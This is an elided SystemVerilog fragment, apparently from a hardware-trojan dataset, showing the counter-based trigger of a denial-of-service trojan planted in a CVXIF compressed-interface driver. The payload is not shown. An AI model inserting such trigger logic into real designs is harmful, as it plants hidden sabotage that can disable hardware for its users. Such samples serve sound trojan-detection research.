...
module cvxif_compressed_if_driver_trojan_DoS #(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=22782)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 22782;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (compressed_ready_i) trojan_counter <= trojan_counter + 1;
